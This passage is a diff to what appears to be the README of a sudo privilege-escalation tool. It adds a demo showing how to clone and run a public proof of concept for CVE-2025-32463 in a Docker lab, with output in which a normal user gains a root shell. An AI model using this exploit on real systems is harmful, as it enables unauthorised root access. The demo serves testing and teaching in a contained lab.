@@ -96,6 +96,28 @@ docker pull th3xace/sudo_killer_demo2
 docker run --user 1000 --rm -it th3xace/sudo_killer_demo2
 ```
 
+```shell
+(This docker is only to test the CVE-2025-32463 (chwoot)) -> Credits to author
+$ git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git
+$ cd CVE-2025-32463_chwoot
+
+# Build and run Docker image (tagged "sudo-chwoot")
+$ service docker start 
+$ ./run.sh
+
+# Run exploit in container (runs root command directly or drops you into a root shell)
+pwn@f722d9182d1f:~$ ./sudo-chwoot.sh id
+woot!
+uid=0(root) gid=0(root) groups=0(root),1001(pwn)
+
+pwn@f722d9182d1f:~$ ./sudo-chwoot.sh
+woot!
+
+root@f722d9182d1f:/# id
+uid=0(root) gid=0(root) groups=0(root),1001(pwn)
+
+```
+
 ## Why is it possible to run "sudo -l" without a password?
 
 By default, if the NOPASSWD tag is applied to any of the entries for a user on a host, you will be able to run "sudo -l" without a password. This behavior may be overridden via the verifypw and listpw options.
